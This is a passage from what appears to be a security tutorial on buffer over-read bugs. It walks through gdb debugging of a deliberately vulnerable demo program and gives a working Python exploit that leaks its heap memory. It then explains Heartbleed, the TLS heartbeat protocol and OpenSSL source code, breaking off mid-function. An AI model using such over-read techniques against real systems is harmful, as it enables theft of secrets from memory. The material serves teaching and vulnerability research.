      0x7ffff7f98000     0x7ffff7f9b000     0x3000   0x1cd000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7f9b000     0x7ffff7fa6000     0xb000        0x0 
      0x7ffff7fc6000     0x7ffff7fca000     0x4000        0x0 [vvar]
      0x7ffff7fca000     0x7ffff7fcc000     0x2000        0x0 [vdso]
      0x7ffff7fcc000     0x7ffff7fcd000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7fcd000     0x7ffff7ff1000    0x24000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x25000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x2e000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x30000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
(gdb) 
</code></pre><p>The process mappings shows that the buffer memory belongs to the main program heap as the buffer address is in the heap range, as shown below:</p>
<pre tabindex="0"><code>(gdb) python print( 0x555555559000 &lt; 0x55555555a490 &lt; 0x55555557a000 )
True
(gdb) 
</code></pre><p>The most interstring part that will target is that:</p>
<pre tabindex="0"><code>   0x0000555555555611 &lt;+816&gt;:	lea    rax,[rip+0xaf0]        # 0x555555556108
   0x0000555555555618 &lt;+823&gt;:	mov    rdi,rax
   0x000055555555561b &lt;+826&gt;:	call   0x555555555110 &lt;strdup@plt&gt;
   0x0000555555555620 &lt;+831&gt;:	mov    rdx,rax
   0x0000555555555623 &lt;+834&gt;:	mov    eax,DWORD PTR [rbp-0x18]
   0x0000555555555626 &lt;+837&gt;:	cdqe   
   0x0000555555555628 &lt;+839&gt;:	mov    QWORD PTR [rbp+rax*8-0x9040],rdx
   0x0000555555555630 &lt;+847&gt;:	add    DWORD PTR [rbp-0x18],0x1
   0x0000555555555634 &lt;+851&gt;:	cmp    DWORD PTR [rbp-0x18],0xfff
   0x000055555555563b &lt;+858&gt;:	jle    0x555555555611 &lt;main+816&gt;
   0x000055555555563d &lt;+860&gt;:	lea    rax,[rip+0xae4]        # 0x555555556128
</code></pre><p>Those instructions are responsible for doing an internal task that isn&rsquo;t related to the reading process itself. I put it intentionally for the purpose of testing the vulnerability and the possibility of exploiting it. Firstly, the program loads a data address from the program&rsquo;s sections itself, and then it passes that address to a function called <code>strdup</code> The result of that function is saved within the stack, and the function keeps doing that in a loop until the value at <code>rbp-0x18</code> reaches 0xfff, as the program increases that value at every single iteration. Let&rsquo;s set a breakpoint after the loop ends at <code>0x000055555555563d</code> and examine the stack to figure out those data.</p>
<pre tabindex="0"><code>(gdb) b *0x000055555555563d
Breakpoint 3 at 0x55555555563d
(gdb) c
Continuing.

Breakpoint 3, 0x000055555555563d in main ()
(gdb) x/30a $rbp-0x9040 
0x7fffffff4f20:	0x555555559480	0x5555555594b0
0x7fffffff4f30:	0x5555555594e0	0x555555559510
0x7fffffff4f40:	0x555555559540	0x555555559570
0x7fffffff4f50:	0x5555555595a0	0x5555555595d0
0x7fffffff4f60:	0x555555559600	0x555555559630
0x7fffffff4f70:	0x555555559660	0x555555559690
0x7fffffff4f80:	0x5555555596c0	0x5555555596f0
0x7fffffff4f90:	0x555555559720	0x555555559750
0x7fffffff4fa0:	0x555555559780	0x5555555597b0
0x7fffffff4fb0:	0x5555555597e0	0x555555559810
0x7fffffff4fc0:	0x555555559840	0x555555559870
0x7fffffff4fd0:	0x5555555598a0	0x5555555598d0
0x7fffffff4fe0:	0x555555559900	0x555555559930
0x7fffffff4ff0:	0x555555559960	0x555555559990
0x7fffffff5000:	0x5555555599c0	0x5555555599f0
(gdb) python print( 0x555555559000 &lt; 0x555555559480 &lt; 0x55555557a000 )
True
(gdb) python print( 0x555555559000 &lt; 0x5555555594b0 &lt; 0x55555557a000 )
True
(gdb) x/s 0x555555559480 
0x555555559480:	&#34;THIS IS A TOP SECRET DATA *_*\n&#34;
(gdb) x/s 0x5555555594b0
0x5555555594b0:	&#34;THIS IS A TOP SECRET DATA *_*\n&#34;
(gdb) x/s 0x5555555599f0
0x5555555599f0:	&#34;THIS IS A TOP SECRET DATA *_*\n&#34;
(gdb) 
</code></pre><p>As shown, the program pushes addresses belonging to the main heap onto the stack. Those heap addresses contain the program&rsquo;s secret data we can never access as users. But we need to know some important facts: where this data is located in memory in relation to the buffer we are supposed to read from. Let&rsquo;s continue debugging to discover that:</p>
<pre tabindex="0"><code>(gdb) python print( 0x55555555a490 &lt; 0x555555559480 )
False
(gdb) python print( 0x55555555a490 &lt; 0x5555555599f0 )
False
(gdb) 
</code></pre><p>Unfortunately, the program&rsquo;s secret data is stored in memory before the buffer that we are supposed to read from. However, the program stores a lot of secrets inside the heap, and there may be more stored after the buffer chunk, so let&rsquo;s continue examining the stack and discover the ranges of those addresses:</p>
<pre tabindex="0"><code>(gdb) x/30a $rbp-0x9040+0x100
0x7fffffff5020:	0x555555559a80	0x555555559ab0
0x7fffffff5030:	0x555555559ae0	0x555555559b10
0x7fffffff5040:	0x555555559b40	0x555555559b70
0x7fffffff5050:	0x555555559ba0	0x555555559bd0
0x7fffffff5060:	0x555555559c00	0x555555559c30
0x7fffffff5070:	0x555555559c60	0x555555559c90
0x7fffffff5080:	0x555555559cc0	0x555555559cf0
0x7fffffff5090:	0x555555559d20	0x555555559d50
0x7fffffff50a0:	0x555555559d80	0x555555559db0
0x7fffffff50b0:	0x555555559de0	0x555555559e10
0x7fffffff50c0:	0x555555559e40	0x555555559e70
0x7fffffff50d0:	0x555555559ea0	0x555555559ed0
0x7fffffff50e0:	0x555555559f00	0x555555559f30
0x7fffffff50f0:	0x555555559f60	0x555555559f90
0x7fffffff5100:	0x555555559fc0	0x555555559ff0
(gdb) python print( 0x55555555a490 &lt; 0x555555559a80 )
False
(gdb) python print( 0x55555555a490 &lt; 0x555555559ff0 )
False
(gdb) x/30a $rbp-0x9040+0x500
0x7fffffff5420:	0x55555555b2f0	0x55555555b320
0x7fffffff5430:	0x55555555b350	0x55555555b380
0x7fffffff5440:	0x55555555b3b0	0x55555555b3e0
0x7fffffff5450:	0x55555555b410	0x55555555b440
0x7fffffff5460:	0x55555555b470	0x55555555b4a0
0x7fffffff5470:	0x55555555b4d0	0x55555555b500
0x7fffffff5480:	0x55555555b530	0x55555555b560
0x7fffffff5490:	0x55555555b590	0x55555555b5c0
0x7fffffff54a0:	0x55555555b5f0	0x55555555b620
0x7fffffff54b0:	0x55555555b650	0x55555555b680
0x7fffffff54c0:	0x55555555b6b0	0x55555555b6e0
0x7fffffff54d0:	0x55555555b710	0x55555555b740
0x7fffffff54e0:	0x55555555b770	0x55555555b7a0
0x7fffffff54f0:	0x55555555b7d0	0x55555555b800
0x7fffffff5500:	0x55555555b830	0x55555555b860
(gdb) python print( 0x55555555a490 &lt; 0x55555555b2f0 )
True
(gdb) 
</code></pre><p>Great, as we expected before. There is more secret data inside the main heap after the buffer we are reading from. However, I want to emphasize the point that the heap may look different depending on the size of that buffer.</p>
<h2 id="programs-flaws">Program&rsquo;s flaws</h2>
<p>The program suffers from many programmatic flaws that we can exploit in order to achieve our goal and force it to leak protected data from private memory. First of all, the program does not check whether the positions from which it reads belong to the data buffer range, as it starts reading without paying attention to that. That means the user can trick the program into reading from a position that may be larger than the buffer size and outside it to any position he wants, and the program will not care about it. There is also another severe flaw that is clearly visible in the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( ulFrom <span style="color:#f92672">!=</span> ulTo )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fputc</span>( pBuffer[ulFrom<span style="color:#f92672">++</span>], stdout );
</span></span></code></pre></div><p>In this code responsible for printing data on the screen, a critical question comes to your mind: What if the initial value of <code>ulFrom</code> is greater than <code>ulTo</code>?</p>
<h2 id="exploitation">Exploitation</h2>
<p>After we have understood well the nature of how the program works, its flaws, and vulnerabilities, we are now ready to build the appropriate exploitation of it. Let us get started developing it using Python programming language.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> subprocess <span style="color:#f92672">import</span> Popen, PIPE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TARGET_PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./FileReader&#34;</span>
</span></span><span style="display:flex;"><span>FILENAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./test.txt&#34;</span>
</span></span><span style="display:flex;"><span>_to <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>ctr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open( FILENAME, <span style="color:#e6db74">&#34;w+&#34;</span> ) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    _from <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">&#34;This file crafted to exploit a buffer over-read bug!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> Popen( [TARGET_PATH, <span style="color:#e6db74">&#34;-from&#34;</span>, str(_from), <span style="color:#e6db74">&#34;-to&#34;</span>, str(_to), FILENAME], stdout<span style="color:#f92672">=</span>PIPE, stderr<span style="color:#f92672">=</span>PIPE )
</span></span><span style="display:flex;"><span>out, _ <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> p<span style="color:#f92672">.</span>returncode <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>    print( <span style="color:#e6db74">&#34;[-] The program has exited with </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> code&#34;</span> <span style="color:#f92672">%</span> (p<span style="color:#f92672">.</span>returncode) )
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit( p<span style="color:#f92672">.</span>returncode )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> out[ out<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2d\x0a</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span> : out<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a\x2d</span><span style="color:#e6db74">&#34;</span>) ]
</span></span><span style="display:flex;"><span>_nread <span style="color:#f92672">=</span> _to <span style="color:#f92672">-</span> _from
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(out) <span style="color:#f92672">&lt;</span> _nread:
</span></span><span style="display:flex;"><span>    print( <span style="color:#e6db74">&#34;[-] The program is not vulnerable!&#34;</span> )
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ctr <span style="color:#f92672">&lt;</span> _nread:
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">%</span> (_nread <span style="color:#f92672">-</span> ctr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(ctr, ctr <span style="color:#f92672">+</span> n):
</span></span><span style="display:flex;"><span>        print( <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> out[i], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print( <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>n)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(ctr, ctr <span style="color:#f92672">+</span> n):
</span></span><span style="display:flex;"><span>        print( chr(out[i]) <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&lt;</span> out[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x80</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;.&#39;</span>, end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print()
</span></span><span style="display:flex;"><span>    ctr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">16</span>
</span></span></code></pre></div><p>This dirty code exploits the program&rsquo;s flaws we discussed to arbitrarily read private memory. First, the exploit code imports some important libraries and specifies the program path, input file name, and a variable intended to trick the targeted program into where it should read without stopping. After that, it creates the input file and writes it to the hard disk to pass its path to the program later. Then, it spawns the program, passes the crafted malicious inputs to the program, and interacts with the program to retrieve the memory leaks from it. But before that, it verifies that the program has finished correctly without errors, and it also verifies that the exploitation has succeeded by verifying that the size of the program&rsquo;s output is large and abnormal. That clearly indicates the occurrence of a leak. In the final step, the exploit tool prints only the leaked data from memory, ignoring other program&rsquo;s stuff. It displays it in a nice format, formatting the leaked data in hexadecimal with its ASCII representation.</p>
<center><img src="/imgs/bor_exploit.png"/></center>
<p><strong>Bingo</strong>, we could force the program to leak sensitive data from private memory. We can trick it into leaking more, but I wanted to leak small data for demonstration, as it&rsquo;s enough to understand the concept.</p>
<h2 id="heartbleed-bug">Heartbleed Bug</h2>
<p>The Heartbleed vulnerability is the most famous buffer over-read bug that has been discovered, and many have talked about it, and many articles have been written about it. This vulnerability was discovered in the famous cryptographic library <a href="https://en.wikipedia.org/wiki/OpenSSL">OpenSSL</a>, which is widely used on most devices and servers in the world. The vulnerability, formally known as <strong>CVE-2014-0160</strong>. It got its name because the bug was in the OpenSSL&rsquo;s implementation of the Heartbeat Extension for the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">Transport Layer Security</a> (TLS) and <a href="https://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security">Datagram Transport Layer Security</a> (DTLS) protocols.</p>
<h3 id="the-impact-of-the-heartbleed">The impact of the Heartbleed</h3>
<p>The bug could be exploited regardless of whether the vulnerable OpenSSL instance is running as a server or a client. It enables attackers to leak a maximum of 64KB over the network; we will know the reason later when getting started in analysis. However, Attackers could send multiple attacks and read multiple batches of 64KB data until enough secrets are revealed.</p>
<p>The leaked data may contain a lot of secrets such as usernames, passwords, session keys, session cookies, and the encryption keys themselves, which would enable attackers to decrypt any past and future communications to the protected services and to impersonate the service as well. Moreover, the leaked data may include unencrypted exchanges between TLS parties likely to be confidential, including any form post data in users&rsquo; requests.</p>
<center><img src="/imgs/heartbleed.webp" width="400" height="806" /></center>
<p>To successfully develop an exploit for this bug and take advantage of it, we need to know some basics about TLS/DTLS protocols and understand how they work because in order to exploit this vulnerability, we need to implement the protocol ourselves for sending the chain of malicious messages that trigger the bug and forcing it to leak sensitive data to servers controlled by us.</p>
<h3 id="what-are-tlsdtls--how-they-work">What are TLS/DTLS? &amp; How they work?</h3>
<p>Transport Layer Security (TLS) protocol aims to protect data and is designed to facilitate privacy and data security for communications over the Internet. It is implemented on top of TCP to encrypt Application Layer protocols such as HTTP, FTP, and SMTP, although it can also be implemented on top of unreliable transport protocols such as UDP and SCTP. That is known as Datagram Transport Layer Security (DTLS). TLS/DTLS offers three main components to accomplish: Encryption that hides the data being captured from third parties, Authentication to ensure that the parties exchanging information are who they claim to be, and Integrity.</p>
<p>TLS/DTLS consists of two main composed layers: the Handshake Protocol and the Record Protocol. Each one of those consists of sub-protocols for different purposes. At the lowest level, on top of some reliable/unreliable transport protocols is the Record Protocol which provides connection security.</p>
<p>The Record Protocol is a layered protocol. At each layer, messages may include fields for length, description, and content. The Record Protocol takes messages to be transmitted, fragments the data into manageable blocks, optionally compresses the data, applies a MAC, encrypts, and transmits the result. On the other hand, the received data is decrypted, verified, decompressed, and reassembled, then delivered to higher-level clients or the application layer.</p>
<p>When a client and server first start communicating, they agree on a protocol version, select cryptographic algorithms, optionally authenticate each other, and use public-key encryption techniques to generate shared secrets. That negotiation process involves several details and steps as follows:</p>
<ul>
<li>Exchange hello messages to agree on algorithms, exchange random values, and check for session resumption.</li>
<li>Exchange the necessary cryptographic parameters to allow the client and server to agree on a premaster secret.</li>
<li>Exchange certificates and cryptographic information to allow the client and server to authenticate themselves.</li>
<li>Generate a master secret from the premaster secret and exchange random values.</li>
<li>Provide security parameters to the record layer.</li>
<li>Allow the client and server to verify that their peer has calculated the same security parameters and that the handshake occurred without tampering by an attacker.</li>
</ul>
<p>In the distant past, both TLS and DTLS had a lack in their design. TLS was keeping the connection alive without continuous data transfer. And DTLS, since it is based on unreliable protocols. Usually, such protocols have no session management. The only mechanism available at the DTLS layer to figure out if a peer is still alive is a costly renegotiation, particularly when the application uses unidirectional traffic. For this reason, the Heartbeat protocol/extension came to solve this problem.</p>
<p>The Heartbeat is a protocol running on top of the Record Layer. it consists of two message types: HeartbeatRequest and HeartbeatResponse. When a peer needs to send Heartbeat messages, it has to send HeartbeatHello message to indicate whether Heartbeats are supported or not.</p>
<p>Heartbeat messages consist of:</p>
<ul>
<li><strong>type</strong>: A byte indicates the message type, either HeartbeatRequest or HeartbeatResponse.</li>
<li><strong>payload_length</strong>: Two bytes specifiy the length of the payload.</li>
<li><strong>payload</strong>: The payload consists of arbitrary content.</li>
<li><strong>padding</strong>: The padding is random content that must be ignored by the receiver. the padding length is the HeartbeatMessage length - payload_length - 3. The padding_length MUST be at least 16.</li>
</ul>
<p>A HeartbeatRequest message can arrive almost at any time during the lifetime of a connection. Whenever a HeartbeatRequest message is received, it should be answered with a corresponding HeartbeatResponse message carrying an exact copy of the payload of the received HeartbeatRequest. If no corresponding HeartbeatResponse message has been received after some amount of time, the TLS/DTLS connection may be terminated by the peer that initiated the sending of the HeartbeatRequest message.</p>
<h3 id="source-code-analysis">Source code analysis</h3>
<p>As we know, the OpenSSL library is open source, and it is possible for us to look at the code and understand how it works internally. This will facilitate our task in developing an exploit for the vulnerability. But the question now is where should we start? as the library is large and complex.</p>
<p>Usually in these cases, I start from the commit or code that fixes the bug and delve into understanding the full image from that point. After spending some time searching in the appropriate branch for the affected versions I found <a href="https://github.com/openssl/openssl/commit/7e840163c06c7692b796a93e3fa85a93136adbb2">this</a>.</p>
<p>Great, a good description clarifies the bug and gives us useful hints. Moreover, we knew now the vulnerable function, and when we analyze the fix, we will understand the root cause of it. But before that, we must answer many questions like where, when, and how this function gets called. How can we as users or clients trigger it?</p>
<p>The vulnerable function is implemented for both TLS and DTLS. I will focus on TLS now. Let&rsquo;s get started tracing from where the protocol receives the packet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ssl3_read</span>(SSL <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ssl3_read_internal</span>(s, buf, len, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>As shown, the function forward the packet into another function to handle the packet implemented as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ssl3_read_internal</span>(SSL <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">int</span> len, <span style="color:#66d9ef">int</span> peek)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">clear_sys_error</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>renegotiate) <span style="color:#a6e22e">ssl3_renegotiate_check</span>(s);
</span></span><span style="display:flex;"><span>	s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>in_read_app_data<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	ret<span style="color:#f92672">=</span>s<span style="color:#f92672">-&gt;</span>method<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ssl_read_bytes</span>(s,SSL3_RT_APPLICATION_DATA,buf,len,peek);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span> (s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>in_read_app_data <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* ssl3_read_bytes decided to call s-&gt;handshake_func, which
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * called ssl3_read_bytes to read handshake data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * However, ssl3_read_bytes actually found application data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * and thinks that application data makes sense here; so disable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * handshake processing and try to read application data again. */</span>
</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">-&gt;</span>in_handshake<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>		ret<span style="color:#f92672">=</span>s<span style="color:#f92672">-&gt;</span>method<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ssl_read_bytes</span>(s,SSL3_RT_APPLICATION_DATA,buf,len,peek);
</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">-&gt;</span>in_handshake<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>in_read_app_data<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>(ret);
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>The function checks whether the re-negotiation is required or not to be handled later. After that, it calls a corresponding function pointer responsible for handling the packet and sends the response to the peer if required. However, the function is re-called again for reasons shown above in the comment.</p>
<p>The corresponding TLS function responsible for that task is <code>ssl3_read_bytes</code>. It&rsquo;s very large because it handles both the handshake and record layer. As it must handle any surprises the peer may have, such as Alert records, ChangeCipherSpec records, or re-negotiation requests. I will not explain every line inside that function. I will focus on what is important for us only.</p>
<p>The first important thing is the function checks whether the handshake has been done or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>s<span style="color:#f92672">-&gt;</span>in_handshake <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SSL_in_init</span>(s))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* type == SSL3_RT_APPLICATION_DATA */</span>
</span></span><span style="display:flex;"><span>    i<span style="color:#f92672">=</span>s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handshake_func</span>(s);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span>(i);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">SSLerr</span>(SSL_F_SSL3_READ_BYTES,SSL_R_SSL_HANDSHAKE_FAILURE);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>The request will be silently discarded, and the function will complete the handshake with the peer if the negotiation is not completed. After that, the function gets TLS records and start handling them.</p>
<center><img src="/imgs/tls_records.png" width="842" height="502" /></center>
<p>When you continue reading the code you will find this case:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#ifndef OPENSSL_NO_HEARTBEATS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (rr<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> TLS1_RT_HEARTBEAT)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">tls1_process_heartbeat</span>(s);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Exit and notify application to read again */</span>
</span></span><span style="display:flex;"><span>        rr<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">-&gt;</span>rwstate<span style="color:#f92672">=</span>SSL_READING;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BIO_clear_retry_flags</span>(<span style="color:#a6e22e">SSL_get_rbio</span>(s));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BIO_set_retry_read</span>(<span style="color:#a6e22e">SSL_get_rbio</span>(s));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span></code></pre></div><p>The protocol handles heartbeats if the heartbeat protocol/extension is supported on the machine that running on. It calls a corresponding TLS function called <code>tls1_process_heartbeat</code> which is the vulnerable function for handling the message.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#ifndef OPENSSL_NO_HEARTBEATS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tls1_process_heartbeat</span>(SSL <span style="color:#f92672">*</span>s)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>s<span style="color:#f92672">-&gt;</span>s3<span style="color:#f92672">-&gt;</span>rrec.data[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>pl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> hbtype;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>; <span style="color:#75715e">/* Use minimum padding */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* Read type and payload length first */</span>
</span></span><span style="display:flex;"><span>	hbtype <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>p<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">n2s</span>(p, payload);
